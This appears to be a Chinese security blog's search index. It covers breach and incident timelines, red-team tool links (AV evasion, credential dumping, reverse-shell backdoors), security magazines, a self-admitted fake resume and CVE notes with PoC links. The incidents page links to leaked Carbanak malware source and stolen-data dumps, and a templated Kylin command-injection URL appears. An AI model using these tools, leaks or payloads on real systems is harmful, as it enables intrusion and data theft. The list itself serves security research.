{"pages":[{"title":"404","text":"","link":"/404.html"},{"title":"Security Incidents","text":"Latest Security Incidents「声明：本博客中涉及到的相关漏洞均为官方已经公开并修复的漏洞，涉及到的安全技术也仅用于企业安全建设和安全对抗研究。本文仅限业内技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。」 2020 【20200715】Twitter账户被大规模入侵事件 官方调查进展：https://twitter.com/TwitterSupport/status/1283591844962750464 https://mp.weixin.qq.com/s/u0j2Tw1cCFmqIZMogEKV-g 细节和整改措施：https://www.cnbeta.com/articles/tech/1004863.htm 【20200401】万豪又报告520客户信息泄露 https://www.bleepingcomputer.com/news/security/marriott-reports-data-breach-affecting-up-to-52-million-guests/ 2019 【20191211】2019年全球重大网络攻击及数据泄露事件回顾 https://www.freebuf.com/articles/network/222565.html [20191122]一加被入侵订单信息泄露 https://forums.oneplus.com/threads/security-notification.1144088/ 【20191101】Web.com知名域名服务商信息泄露 https://www.freebuf.com/news/218772.html 【20191012】Twitter流传FireEyeSummit大会上曝出APT41曾入侵Teamview进行供应链攻击 https://mp.weixin.qq.com/s/9_CvcElTDDl81ZkXSPtpdw https://www.fireeye.com/blog/threat-research/2019/08/apt41-dual-espionage-and-cyber-crime-operation.html APT41 疑似与 Winnti、BARIUM 为同一团伙，而Winnti 疑似与Axiom、APT17、Ke3chang为同一团伙。 【20190920】PHPStudy被爆出2016年以来被植入后门 后门分析：https://www.freebuf.com/news/topnews/214912.html 隐藏后门分析：https://mp.weixin.qq.com/s/dTzWfYGdkNqEl0vd72oC2w 【20190526】Canva 1.39 亿用户数据泄露 https://www.solidot.org/story?sid=60755 【20190526】易到用车服务器被攻击，核心数据库被锁 https://www.cnbeta.com/articles/tech/850865.htm 【20190419】APT34军火库泄露 APT34攻击样本分析http://blog.nsfocus.net/apt34-event-analysis-report/ 主要内容由： Glimpse（DNS隧道远控工具） PoisonFrog（窃取受控端信息和执行C&amp;C端cmd指令的的远控工具） Webmask（DNS代理与HTTP劫持， 包括一个ICAP协议的透明代理脚本，ICAP通常用于扩展透明代理服务器，在透明HTTP代理缓存中实现内容过滤器等功能） ICAP协议全称是Internet Content Adaptation Protocol，RFC 3507 【20190130】LinkedIn数据泄露 1月30日上午，一位名叫“Andrev”的黑客通过Pastebin发布了一则消息，声称其攻击了LinkedIn服务器，并窃取了约1.59亿的用户信息。 https://www.freebuf.com/news/195406.html 2018 【20190101】2018网络安全大事记 https://mp.weixin.qq.com/s/YvlUX8Zjp9gfAtJ6YY27BA 【20181214】供应链攻击：驱动人生升级通道被攻击，软件携带后门病毒 https://www.freebuf.com/vuls/192014.html 一场精心策划的针对驱动人生公司的定向攻https://www.freebuf.com/articles/system/192194.html 【20181127】供应链攻击：JavaScript公共库event-stream被植入恶意代码 https://cert.360.cn/warning/detail?id=00e13636ea1705250545e370bbd8b539 恶意依赖已经存在了2.5个月内未被发现 https://mp.weixin.qq.com/s/IaOWxG0XLvn2znvvP1dmwA 相关的Github Issues: https://github.com/dominictarr/event-stream/issues/115https://github.com/dominictarr/event-stream/issues/116 详细介绍：https://snyk.io/blog/malicious-code-found-in-npm-package-event-stream 恶意的commit: https://github.com/dominictarr/event-stream/commit/e3163361fed01384c986b9b4c18feb1fc42b8285 影响范围：如果你的项目使用了加密货币相关的库并且当你运行命令npm ls event-stream flatmap-stream后你可以看到flatmap-stream@0.1.1，你很可能就受影响了 减轻方案：Downgrade to event-stream@3.3.4 受影响版本：event-stream@3.3.6 (目前已知) 或者 flatmap-stream@any 【20180828】华住大量开房信息泄露 【20180817】APT DarkHotel 利用CVE-2018-8373 0day漏洞的攻击与Darkhotel团伙相关的分析https://ti.360.net/blog/articles/analyzing-attack-of-cve-2018-8373-and-darkhotel/ 【20180712】Carbanak APT团伙恶意木马源码泄露 http://mal4all.com/showthread.php?tid=494&amp;action=lastpost https://files.fm/u/t25ymgfm https://ufile.io/x7412 http://transfiles.ru/lhjmn https://dropmefiles.com/CnwWE http://mega.dp.ua/file?source=18070615225769991162 跟进分析：https://www.4hou.com/reverse/17598.html 【20180709】Bancor交易所入侵 https://bcsec.org/index/detail?id=195&amp;tag=1 【20180707】币安API再次出现事故，SYSCoin被高价卖出 https://bcsec.org/index/detail?id=186&amp;tag=2 【20180619】Docker供应链攻击，攻击者如何利用现代容器化趋势获益 分析：https://kromtech.com/blog/security-center/cryptojacking-invades-cloud-how-modern-containerization-trend-is-exploited-by-attackers 新闻：被下载500万次后 Docker Hub终于撤下了后门镜像https://www.cnbeta.com/articles/tech/737509.htm 【20180613】Acfun被黑客攻击，数据泄露，暗网售卖 数据样品：https://github.com/SakuraKisser/AC_300fun 官方公告：http://www.acfun.cn/a/ac4405547 暗网帖子：http://lei6ezsexd4iq2tm.onion/viewtopic.php?f=37&amp;t=4545 【20180524】VPNFilter 新型IoT、网络设备僵尸网络，已感染超过50万台 报告：https://blog.talosintelligence.com/2018/05/VPNFilter.html 分析：VPNFilter-新型IoTBotnet深度解析https://mp.weixin.qq.com/s/SnchceLdNX7JYiWfSH2Hmw 【20180524】BTG（Bitcoin Gold） 51%攻击 报道：https://www.bleepingcomputer.com/news/security/hacker-makes-over-18-million-in-double-spend-attack-on-bitcoin-gold-network/ 【20180509】百度软件中心putty污染 分析：https://m.threatbook.cn/detail/499?from=timeline&amp;isappinstalled=0 【20180423】BEC美链整型溢出漏洞蒸发60亿 分析：https://zhuanlan.zhihu.com/p/35989258? 描述：转账时转账总额存在整型溢出漏洞。攻击者同时转给两个人，转账总金额超过uint256取值范围，溢出为0，绕过了余额校验逻辑。而接收方每个人获得了大量BEC。 分析：BEC漏洞复盘 解析：http://www.freebuf.com/vuls/169741.html 报道：BEC、SMT现重大漏洞，这8个智能合约也可能凉凉 【20180402】1.5亿MyFitnessPal用户的数据被泄漏 报道：http://www.4hou.com/info/news/10939.html vk.com泄露数据：https://mega.nz/#!NSRFDQiR!cSH1YObNiwUAptH7oqzcFi-Zh5Qij7xO1F1Eh87KFQs 【20180320】Facebook用户好友关系泄露 卫报报道：https://www.theguardian.com/technology/2018/mar/17/facebook-cambridge-analytica-kogan-data-algorithm https://mp.weixin.qq.com/s/v9daFF0ZTuHBp-PwteDd0Q 描述：这个应用在要求用户使用Facebook账号登录，给用户 2-5 美元来完成一个调查，同时获取你的好友关系并且查看你点赞了哪些东西，通过调查和你点赞的数据来给你画像，判断你对什么感兴趣，然后以此可以给你更精准的广告信息。 扎克伯格回应: https://www.facebook.com/zuck/posts/10104712037900071 http://url.cn/5ic0R1C 【20180307】币安API Key被攻击 用Unicode的币安域名，底部有两个点，类似于ẹ字符。 https://mp.weixin.qq.com/s/z39hBMif1bQJeb4Ar_zRAw http://36kr.com/p/5122966.html https://steemit.com/eos/@whynot/how-to-newest-phishing-sites-e-g-eos-binance-how-to-protect-yourself 【20180120】一加称 4 万客户的信用卡信息泄露 https://www.solidot.org/story?sid=55280 2017 【201711】macOS High Sierra Root账户空口令漏洞 http://soft.hqbpc.com/html/2017/11/60928.html 【201709】PyPI 官方库被发现混入了名字相似的恶意模块 http://www.solidot.org/story?sid=53867 【201709】Equifax数据泄露事件致CIO和CISO离职 Struts2 2018年12月发布细节，https://oversight.house.gov/wp-content/uploads/2018/12/Equifax-Report.pdf 【201708】 XSHELL 后门植入","link":"/Security%20Incidents/index.html"},{"title":"Read Team","text":"RedTeam Resources「声明：本博客中涉及到的相关漏洞均为官方已经公开并修复的漏洞，涉及到的安全技术也仅用于企业安全建设和安全对抗研究。本文仅限业内技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。」 威胁情报 Threat Intelligence [list] https://github.com/hslatman/awesome-threat-intelligence 红队框架/工具集 Redteam Framework [tools] Utilities for MITRE™ ATT&amp;CK https://github.com/nshalabi/ATTACK-Tools [tools] 好用的渗透工具列表 https://github.com/enaqx/awesome-pentest [book] KALI渗透 https://jobrest.gitbooks.io/kali-linux-cn/content/ [paper] ATT&amp;CK 发布了七款安全产品的评估 https://medium.com/mitre-attack/first-round-of-mitre-att-ck-evaluations-released-15db64ea970d [doc] 红队技术实战 https://ired.team/ [tools] 红队框架 https://ired.team/offensive-security/red-team-infrastructure/automating-red-team-infrastructure-with-terraform [cheatsheet] 红队手册 https://github.com/mantvydasb/Offensive-Security-OSCP-Cheatsheets/ [tools] 渗透、红队工具集 https://github.com/blaCCkHatHacEEkr/PENTESTING-BIBLE [tools] 红队资源集合 https://github.com/yeyintminthuhtut/Awesome-Red-Teaming/ MITRE ATT&amp;CK Matrix Caldera https://github.com/mitre/caldera https://caldera.readthedocs.io/en/latest/index.html Atomic Red Team https://github.com/redcanaryco/atomic-red-team https://atomicredteam.io DumpsterFire https://github.com/TryCatchHCF/DumpsterFire Metta https://github.com/uber-common/metta https://github.com/uber-common/metta/wiki RTA https://github.com/endgameinc/RTA 业内红队 Industry https://specterops.io/ https://www.synack.com/red-team/ 信息搜集 ReconnaissanceOSINT 在线工具 [tools] 企业邮箱搜索工具 http://www.skymem.info/ [tools] 子域名和DNS历史记录Dnstrails https://securitytrails.com/dns-trails [tools] 全网证书搜索 http://crt.sh [tools] 多种域名/IP信息工具 https://viewdns.info/ [tools] https://pentest-tools.com [tools] 全网资产搜索 Shodan https://www.shodan.io/ [tools] 全网资产搜索 Censys https://censys.io [tools] 全网资产搜索 Fofa https://fofa.so/ [tools] 全网资产搜索 Zoomeye https://www.zoomeye.org/ [tools] DNS查询 https://dnsdumpster.com/ [tools] 文件在线监测 VirusTotal https://www.virustotal.com/ [tools] DNS查询 http://www.dnsgoodies.com/ [tools] Google ASE aka Google Dorking [Most effective in some cases] [tools] Spiderfoot [Currently Free, just request for a Spiderfoot instance] [tools] Binaryedge [Paid/Rate-Limited] [tools] onyphe.io [Free mostly] 入口突破 Entry钓鱼 Phishing [tools] https://github.com/klionsec/PhishingExploit [cases] 利用谷歌开放平台OAuth授权，伪装成Google Doc使用GMail传播钓鱼 https://www.reddit.com/r/google/comments/692cr4/new_google_docs_phishing_scam_almost_undetectable/ [blog] Office在线视频钓鱼 https://blog.cymulate.com/abusing-microsoft-office-online-video [tools] 邮件钓鱼工具 https://www.mailsploit.com/index [trick] 利用DOCX文档远程模板注入执行宏https://xz.aliyun.com/t/2496 [trick] 浏览器窗口伪造 https://github.com/openworldoperations/FISHY [trick] 鼠标光标伪造 https://jameshfisher.github.io/cursory-hack/ 硬件交互设备 HID Attack [paper] 打印机利用 http://archive.hack.lu/2010/Costin-HackingPrintersForFunAndProfit-slides.pdf [tools] BadUSB https://mp.weixin.qq.com/s/mIcRNcf5HmZ4axe8N92S7Q 无线入侵 Wireless Attack [tools] 无需四次握手包破解WPA&amp;WPA2密码 http://www.freebuf.com/articles/wireless/179953.html 服务器带外管理BMC、IPMIExploitation [tools] PE文件转为Shellcode / https://github.com/hasherezade/pe_to_shellcode [blog] Java Runtime.exec(String)执行任意命令 https://www.anquanke.com/post/id/159554https://mp.weixin.qq.com/s/pzpc44-xH932M4eCJ8LxYghttp://jackson.thuraisamy.me/runtime-exec-payloads.html [paper] 利用 Java JDBC 驱动利用反序列化漏洞 https://xz.aliyun.com/t/7067 [blog] 关于Jackson的CVEs https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062 [paper] FastJson漏洞历史 https://github.com/miaochiahao/slides/tree/master/fastjson 权限提升 Privilege Escalation [cheatsheet] Windows提权笔记 https://xz.aliyun.com/t/2519 [cheatsheet] Windows提权小抄 https://guif.re/windowseop [cheatsheet] Windows本地提权技巧 http://payloads.online/archivers/2018-10-08/1 [cheatsheet] Linux提权小抄 https://guif.re/linuxeop [exploit] Windows-Exploit-Suggester https://github.com/GDSSecurity/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py [exploit] Linux-Exploit-Suggester https://github.com/PenturaLabs/Linux_Exploit_Suggester/ [exploit] Windows Exploits https://github.com/abatchy17/WindowsExploits [exploit] Windows Sherlock本地提权漏洞检查 https://github.com/rasta-mouse/Sherlock [cheatsheet] Linux sudo滥用提权 http://touhidshaikh.com/blog/?p=790 [blog] 深入解读MS14-068漏洞：微软精心策划的后门？http://www.freebuf.com/vuls/56081.html [paper] Windows特权提升 https://www.exploit-db.com/docs/english/46131-windows-privilege-escalations.pdf [tools] juicy-potato本地提权 https://github.com/ohpe/juicy-potato https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/ [exploit] hh.exe提权 https://twitter.com/FlatL1ne/status/1194208167976165376 [tools] Linux本地信息搜集 https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh 持久化后门 Persistent [tools] Gray Dragon .NET应用Runtime注入工具 / https://www.digitalbodyguard.com/graydragon.html [trick] 利用环境变量，在任意.Net应用DLL注入 / https://mobile.twitter.com/subTee/status/864903111952875521 https://docs.microsoft.com/en-us/previous-versions/dotnet/netframework-4.0/bb384689(v=vs.100) [tools] PHP-FPM无文件后门Webshell https://www.anquanke.com/post/id/163197 [tools] 利用PrintDialog持久化+执行命令 http://www.hexacorn.com/blog/2018/08/11/printdialog-exe-yet-another-lolbin-for-loading-dlls/ [tools] SystemSettings http://www.hexacorn.com/blog/2018/08/12/systemsettings-exe-yet-another-lolbin-for-loading-dlls/ [tools] 二进制加密Webshell https://xz.aliyun.com/t/2744https://github.com/rebeyond/Behinder [cheatsheet] Linux权限维持 https://xz.aliyun.com/t/7338 Post ExploitationWindows 无Powershell.exe的Powershell工具 / https://github.com/Ben0xA/nps 全阶段的Powershell渗透测试脚本 / https://github.com/samratashok/nishang 命令执行 Living off the Land https://github.com/api0cradle/LOLBAS C# 后渗透测试库 SharpSploit 介绍 https://posts.specterops.io/introducing-sharpsploit-a-c-post-exploitation-library-5c7be5f16c51 [blog] Windows执行命令和下载文件总结 https://www.cnblogs.com/17bdw/p/8550189.html [trick] 使用Rundll32运行.Net程序 https://blog.xpnsec.com/rundll32-your-dotnet/ [tools] .NET DllExport https://github.com/3F/DllExport Linux 纯Bash实现的后渗透工具 / https://github.com/TheSecondSun/Bashark/ 凭据窃取 Credentials [tools] SafetyKatz https://github.com/GhostPack/SafetyKatz [tools] Shellcode Dump LSASS https://osandamalith.com/2019/05/11/shellcode-to-dump-the-lsass-process/ [tools] 内网密码搜集和解密工具 https://github.com/klionsec/Decryption-tool 横向移动 Letaral Movement [tools] 域信息搜集，域管理员的六度空间 https://github.com/BloodHoundAD/SharpHound [usage] NMap空闲隐蔽扫描 https://nmap.org/book/idlescan.html [blog] 使用meterpreter进行NTLM中继攻击 https://diablohorn.com/2018/08/25/remote-ntlm-relaying-through-meterpreter-on-windows-port-445/ [tools] Responder NetBIOS名称欺骗和LLMNR欺骗 https://github.com/SpiderLabs/Responder [tools] NTLM Relay 攻击 Exchange Web Services https://github.com/Arno0x/NtlmRelayToEWS [tools] SMB中间人劫持 https://github.com/quickbreach/SMBetray [tools] 代理隧道 https://github.com/txthinking/brook [tool] 代理隧道 https://github.com/Dliv3/Venom 绕过检测 Defense Evasion [book] 效果不错的免杀，使用C#绕过杀毒软件 [tools] 生成免杀的Metasploit Payload / https://github.com/Veil-Framework/Veil [code] 自定义Meterpreter加载 / http://www.freebuf.com/articles/system/53818.html [blog] 九种姿势执行Mimikaz [blog] 使用.Net可执行程序进行渗透 [blog] ATT&amp;CK 攻击矩阵 躲避防御 [blog] 绕过下一代杀软 [blog] Windows NTFS特殊文件夹绕过检测 [paper] Winnti Bootkit http://williamshowalter.com/a-universal-windows-bootkit/ [paper] UEFI Rootkit https://www.welivesecurity.com/2018/09/27/lojax-first-uefi-rootkit-found-wild-courtesy-sednit-group/ [twitter] Linux Bash 混淆 https://twitter.com/DissectMalware/status/1025580967384305664 [tools] 免杀工具 AVEThttps://github.com/govolution/avet [blog] 绕过CrowdStrike检测 https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802 [blog] 10 种绕过杀毒软件的方式 https://blog.netspi.com/10-evil-user-tricks-for-bypassing-anti-virus/ [tools] DLL Side Loding Attack Gen https://github.com/Mr-Un1k0d3r/MaliciousDLLGenerator [tools] BypassAV ShellCode Loader https://github.com/k8gege/scrun [blog] Protecting Your Malware with blockdlls and ACG 利用微软自身提供的安全机制来反EDR https://blog.xpnsec.com/protecting-your-malware/ [blog] Detecting Parent PID Spoofing https://blog.f-secure.com/detecting-parent-pid-spoofing/ [tips] 对抗EDR的三个重要特征： 1. Process Relationship / 2. Suspicious Network / 3. Command Line. [blog] Antivirus Evasion with Python https://medium.com/bugbountywriteup/antivirus-evasion-with-python-49185295caf1 [tool] JS免杀Shellcode https://github.com/Hzllaga/JsLoader [tool] 利用杀毒软件销毁自身 https://www.rack911labs.com/research/exploiting-almost-every-antivirus-software/ [tool] 免杀合集 https://github.com/TideSec/BypassAntiVirus [tool] Apache/Nginx端口转发，隐藏TeamServer https://github.com/threatexpress/cs2modrewrite [tool] 《使用C＃编写自定义后门负载》学习笔记及免杀尝试 https://xz.aliyun.com/t/6222 [tool] 杀软进程名检查 https://github.com/gh0stkey/avList/ C&amp;C [tools] ICMP后门 https://github.com/inquisb/icmpsh [tools] Windows远控 in C# https://github.com/quasar/QuasarRAT [tools] Defcon后渗透工具,大宝剑 https://github.com/zerosum0x0/koadic [tools] Custom Command and Control https://labs.mwrinfosecurity.com/tools/c3 [paper] CobaltStrike教程文档 https://wbglil.gitbooks.io/cobalt-strike/ [blog] PowerGhost挖矿病毒分析 https://www.freebuf.com/articles/system/219715.html [tools] 隐藏网络连接的后门 https://github.com/BeetleChunks/redsails [tools] Powershell反连后门 https://github.com/ZHacker13/ReverseTCPShell [tool] JS VBS Payload生成器 https://github.com/mdsecactivebreach/CACTUSTORCH 数据外传 Data Exfiltration [blog] 数据外传技术 https://www.pentestpartners.com/security-blog/data-exfiltration-techniques/ 杂项 Misc [forum] Hack the box https://www.hackthebox.eu/ [tools] 代码生成手绘图 https://www.websequencediagrams.com/ [tools] 本地代码生成ascii文本绘图 graph::easy [tricks] 技巧汇总 https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet#lbwh-anchor 匿名邮箱和短信接收平台 https://lcx.cc/post/4594/ 复用Gmail邮箱的技巧 https://gmail.googleblog.com/2008/03/2-hidden-ways-to-get-more-from-your.html 中间人 MITM [tools] https://github.com/LionSec/xerosploit 安卓安全 Android [paper] Frida操作手册 https://github.com/hookmaster/frida-all-in-one 逆向分析 Reverse [tools] NSA发布逆向分析框架Ghidra https://www.nsa.gov/resources/everyone/ghidra/ [tools] Modern Java Bytecode Editor https://github.com/Col-E/Recaf 字典 Wordlist 看起来很强的弱密码 https://github.com/r35tart/RW_Password 超全Payload https://github.com/swisskyrepo/PayloadsAllTheThings 扫描&amp;自动化 分布式扫描器WDScanner https://www.freebuf.com/sectool/203772.html 云安全 K8S指南 https://feisky.gitbooks.io/kubernetes/introduction/101.html Web安全 https://github.com/qazbnm456/awesome-web-security [tool] Web扫描通用辅助函数集 https://wsltools.readthedocs.io/en/latest/ XXE [tools] XXE盲打外传工具 https://github.com/TheTwitchy/xxer [tools] 攻击Java RMI https://github.com/NickstaDB/BaRMIe Java安全 [Book] Java安全 https://github.com/anbai-inc/javaweb-sec Defense入侵检测 Detection [blog] 针对微软活动目录（AD）的七大高级攻击技术及相应检测方法 https://www.anquanke.com/post/id/161815 [blog] 攻防对抗：活动目录中的欺骗技术 https://www.anquanke.com/post/id/162210 [tools] Webshell查杀 http://www.shellpub.com/ 主机加固 [blog] 隐藏其他用户的进程信息 https://linux-audit.com/linux-system-hardening-adding-hidepid-to-proc/ 法律法规 Laws 中国网络安全法 https://baike.baidu.com/item/%E4%B8%AD%E5%8D%8E%E4%BA%BA%E6%B0%91%E5%85%B1%E5%92%8C%E5%9B%BD%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B3%95/16843044 美国信息泄露通知法 https://en.wikipedia.org/wiki/Security_breach_notification_laws 美国信息泄露通知法 https://en.wikipedia.org/wiki/California_S.B._1386","link":"/Read%20Team/index.html"},{"title":"Stop learning","text":"师傅们求求了，别再学了 :(“「声明：本博客中涉及到的相关漏洞均为官方已经公开并修复的漏洞，涉及到的安全技术也仅用于企业安全建设和安全对抗研究。本文仅限业内技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。」 Black Hat [video] Black Hat USA 2019 视频 https://www.youtube.com/playlist?list=PLH15HpR5qRsWrfkjwFSI256x1u2Zy49VI&amp;hootPostID=c85fbdb76ae4b957bf70f00f346caa62 文章收藏 鱼叉攻击尝试 https://payloads.online/archivers/2019-05-21/1 黑客杂志期刊国外黑客杂志《phrack》黑客杂志http://www.phrack.org《phrack》创刊于80年代，是世界级的顶级黑客杂志，每年只有一期，纯TXT风格的。 《(IN)SECURE Magazine》(IN)SECURE Magazine国外著名的一本信息安全杂志，由net-security组织出版的，提供PDF下载，现在还在更新。 《Virus Bulletin 》病毒杂志Virus Bulletin : Virus Bulletin《Virus Bulletin》是一本在线杂志，建立于1989年，主要关注计算机恶意软件的防御、检测、清除以及遭受攻击后数据的恢复，为电脑用户提供anti-malware 的相关技术资料，目的在于促进反恶意软件领域的发展。在其官方网站上有提供该杂志的PDF文件以及在线HTML浏览。 《hakin9》https://hakin9.org/《hakin9》是一部关于hacking与IT安全的半月刊杂志，主要关注计算机系统渗透与防御技术。该杂志提供了各种语言版本，并在各国发行，主要有以下几种语言：英语、法语、西班牙语、波斯语、德语、意大利语、捷克语，可惜就是没有汉语。不过《hakin9》是本收费杂志，在其网站上可购买你所喜欢的文章，一篇3美元，一本杂志是30美元，因此我也没有看过，只是在网站上有提供文章的部分内容。 《2600》www.2600.org在国外比较出名的一本黑客杂志，但中国大陆未销售，网上也只有几期可以下载而已！ 《hack this zine》黑客杂志，已停更http://hackbloc.org/zine04年创刊的一本黑客杂志，现在只有五期，上面的链接都已经失效了。 《Uninformed》Uninformed - vol 10，已停更《Uninformed》是本在线电子黑客杂志，网站的内容即是杂志内容，这与《phrack》有点相似，现已出版10期，我都是在每期的杂志中挑选几篇自己感兴趣的文章放到MP3上看，杂志的内容都是涉及多领域的技术，挺有技术含量，当年官方称第11期即将到来，就这样我苦等就几年，到现在还是没更新，但网站依然可以浏览，以往文章还可以阅读。 《K-1ine Magazine》http://www.nettwerked.net/files.html#K1INE国外创刊比较早的一本安全杂志之一，已出版51期了，可以在线阅读。对于这本杂志，本人对里面的内容看得比较少，里面自己感兴趣的内容比较少吧。 病毒技术杂志《29A(西班牙29A毒客组织杂志)》http://www.29a.net/当年相当出名的一本病毒杂志，在网上还可以搜索到部分文章，都是曾经挺经典的文章，包括windows mobile和塞班手机系统上的第一个病毒demo，也是29A公布的。 XINE毒客组织病毒杂志http://elfhack.whitecell.org/docs/ 国内黑客杂志《黑客防线》黑客防线官方站早期很出名的国内收费杂志，现在变成免费的电子杂志，质量也有所下载。 《安全参考》安全参考一本国内新出的杂志，主要收集网络上的安全文章汇总而成的，在网上可免费下载。 《信息网络安全杂志》http://202.127.0.130/page/wlzz.html公安部出的杂志，一本20块，更多偏于学术派研究。 《信息安全与技术》中国电子信息产业发展研究院与北京赛迪经纶传媒投资有限公司创办的，按文章来卖，0.5元/页。 《Ph4nt0m Webzine》http://www.80vul.com/webzine《Ph4nt0m Webzine》电子杂志是由国内著名的安全组织幻影旅团Ph4nt0m创办的，也是创办于08年，主要关注于关注于于漏洞分析、加密解密、协议安全分析、后门与rootkit技术、web应用安全、系统底层分析、操作系统安全性、企业安全防护方案等等。 《黑客手册》http://www.nohack.cn非安全出品的一本黑客杂志，这杂志我没买过，只是看过其中一些文章，以及几本杂志的目录，个人觉得这本杂志的内容更趋向于脚本安全，很多非安全出版的书可能WEB安全方面的居多吧，个人观点而已，具体的我也不是很了解，我也很想看看这本杂志。 《黑客X档案》黑客X档案这本杂志我也没看过，只看过它的一些期刊的目录，技术含量一般，但挺适合入门的，也正因此当年的销售量比黑防、黑手要多。 《软件安全》http://www.sinoit.org.cn/ 由国内的电子工业出版社在08年12月开始主办的，是一免费的电子期刊，每期的文章都有摘录一些安全书籍上面的文章，以及其它一些原创的文章和软件安全峰会上的讲稿，并经常会介绍一些黑客书籍。上面都是一些比较专业的文章，大多是由一些安全专家编写的。 Referenceshttps://www.zhihu.com/question/31819227/answer/53694664","link":"/Stop%20learning/index.html"},{"title":"categories","text":"","link":"/categories/index.html"},{"title":"tags","text":"","link":"/tags/index.html"},{"title":"search","text":"","link":"/search/index.html"},{"title":"about me","text":"1.精通java研发，比较熟悉python、 shel研发， 熟悉C、汇编，web前端(HTML、 css、 js、 angular等) , android研发，较了解C++、R、PHP、ios研发，精通常见的设计模式，集合，多线程开发，线程安全，五种IO模型,精通JVM的结构和原理;2.精通Spring,Spring,Spring boot,Spring Cloud, Spring Mvc,Spring data jpa,mybatis,hibernate等开源框架;3.精通restful风格的接口、dubbo风格的接口的设计与编写;4.有过报表，定时任务，自己实现的单点登录，基于CAS企业级的单点登录，定制化视图，动环，傻瓜式部署开发经验;5.熟悉Storm, Hadoop的原理，Tomcat集群， ngnix高可用，fastdfs集群，redis集群， solr集群,apache配置及部署;6.熟悉常见的Linux命令，熟悉高并发分布式架构设计，熟悉云计算相关的业务与运维;7.熟悉redis, memcache, mongodb, kafka中间件的原理及使用;8.互联网电商架构及研发经验;9.熟悉Sphinx, Lucene.Solr搜索引擎， ActiveMQ,RocketMQ,kafka消息中间件的原理及使用;10.可以自己手动写一个RPC框架;11.可以自己手动写一个MyBatis框架;12.可以自己手动写一个Tomcat框架;13.可以自己手动写一个SpringMV C框架;14.可以自己手动写一个JDBC框架;15.可以手动写一个dubbo框架;16.可以手动写一个netty框架;17深入研究过编译器底层原理及源码，非常熟悉词法分析、语法分析，可从事编译器的研发;18.较深入研究过Iinux操作系统内核底层原理及源码，系统调用、内存分配算法、进程间关系等，可从事操作系统内核的研发;19.可以手动写个正则表达式的引擎;20.研究过大数据: hadoop、 hdfs、 hive、 pig、 hbase、 spark、 flink、strom等框架，有一定的实战经验，可从事大数据的研发;21.可以手动写一一个Spring 事务机制;22.深入研究过sql server, mysql的底层架构(命令分析器、查询优化器、查询执行器、访问方法、缓存区管理器、事务管理器等)，可从事数据库内核的研发;23.对AI、机器学习、深度学习的模型建立、训练数据集、测试数据集、 监督算法、无监督算法及整个算法流程有较深入的理解;24.研究过网络安全，对xss、 csrf、 sql注入、ddos攻击、 DNS劫持、arp攻击等有较深入的理解;对密码学有较深入的研究，精通web登录的流程及底层原理；熟悉网络攻击工具，比如:一句话木马、穿山甲、中国菜刀等。25.对算法(递归、动态规划等)及数据结构(数组、链表、堆栈、B类树、二叉树、图等)有较深入的理解。26.对传统互联网、移动互联网、大数据、云计算、Al、 区块链等业务技术有较深入的理解;27.可以手动写一个区块链;28.有较深厚的数学功底，大学期间，高等数学竞赛荣获全校第一名，概率论、离散数学及线性代数大学成绩几乎满分;29.JVM调优，linux内核调优、 tcpip协议栈， 数据库性能调优，ngnix、 tomcat参 数调优都有较丰富的经验。 30.编的。学习去了～","link":"/about/index.html"},{"title":"Vulnerabilities","text":"Vulnerabilities「声明：本博客中涉及到的相关漏洞均为官方已经公开并修复的漏洞，涉及到的安全技术也仅用于企业安全建设和安全对抗研究。本文仅限业内技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。」 2020 【20200811】zerologon 特权提升漏洞预警 http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202008-548 Poc: https://github.com/SecuraBV/CVE-2020-1472 Exp: `` 【20200716】Apache Kylin命令注入漏洞CVE-2020-13925 https://www.anquanke.com/post/id/210867 PoC: http://example.com/kylin/api/diag/project/此处命令注入/download 影响版本：3.1.0以下版本 修复分析：dumpProjectDiagnosisInfo() 中增加了 CliCommandExecutor.checkParameter(project) 进行参数检查 历史相关漏洞：CVE-2020-1956 https://paper.seebug.org/1237/ 【20200715】Windows DNS Server命令执行漏洞CVE-2020-1350 漏洞描述：https://cert.360.cn/warning/detail?id=f0dbf54330467091e86643d2c0419a6b 官方修复指南：https://support.microsoft.com/zh-cn/help/4569509/windows-dns-server-remote-code-execution-vulnerability 【20200703】F5 BIG-IP的流量管理用户页面TMUI存在Java代码执行漏洞 CVE-2020-5902 https://cert.360.cn/warning/detail?id=a1768348bde7807647cbc7232edce7df Exploit: https://github.com/jas502n/CVE-2020-5902 【20200623】Apache Dubbo反序列化漏洞 https://paper.seebug.org/1263/ https://paper.seebug.org/1266/ 【20200602】FastJson反序列化漏洞，绕过Autotype 影响1.2.69以下版本 通过expectClass绕过Autotype限制 需要目标服务器上存在可利用的Gadget，才能进行命令执行 https://paper.seebug.org/1236/ 【20200501】SaltStack认证绕过远程命令执行 https://labs.f-secure.com/advisories/saltstack-authorization-bypass 【20200401】Liferay 反序列化漏洞 CVE-2020-7961 https://www.anquanke.com/post/id/203870 浅谈Liferay Portal JSON Web Service未授权反序列化远程代码执行漏洞 https://xz.aliyun.com/t/7485 【20200312】微软SMBv3蠕虫级远程命令执行漏洞CVE-2020-0976 官方公告：https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0796 漏洞预警：https://cert.360.cn/warning/detail?id=66c5a7404bd9b969016b91073483720c PoC：https://github.com/danigargu/CVE-2020-0796 【20200226】Exchange服务器命令执行漏洞RCE CVE-2020-0688 官方公告：https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0688 漏洞分析：https://nosec.org/home/detail/4158.html PoC: https://github.com/Jumbo-WJB/CVE-2020-0688/blob/master/CVE-2020-0688.py 注意：CU12也受影响 